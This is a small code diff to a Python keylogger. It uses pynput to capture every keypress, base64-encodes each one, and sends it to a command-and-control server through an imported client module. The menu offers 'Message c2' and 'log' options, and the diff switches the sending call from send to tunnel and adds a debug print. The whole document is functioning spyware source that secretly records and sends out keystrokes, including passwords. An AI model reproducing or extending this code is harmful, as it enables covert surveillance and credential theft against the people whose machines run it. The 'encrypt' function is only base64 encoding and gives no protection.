@@ -2,6 +2,8 @@ import client
 from pynput.keyboard import Key, Listener
 import base64
 
+
+
 def init():
     print("1 - Message c2")
     print("2 - log")
@@ -19,6 +21,7 @@ def encrypt(data):
     data = str(data)
     data = data.encode("utf-8")
     data = base64.b64encode(data)
+    data = data.decode("utf-8")
     return data
 
 
@@ -31,7 +34,8 @@ def decrypt(data):
 
 def log():
     def on_press(key):
-        client.send(encrypt(key))
+        client.tunnel(encrypt(key))
+        print("KEY ",key,"\n")
     with Listener(on_press=on_press) as listener:
         listener.join()
 
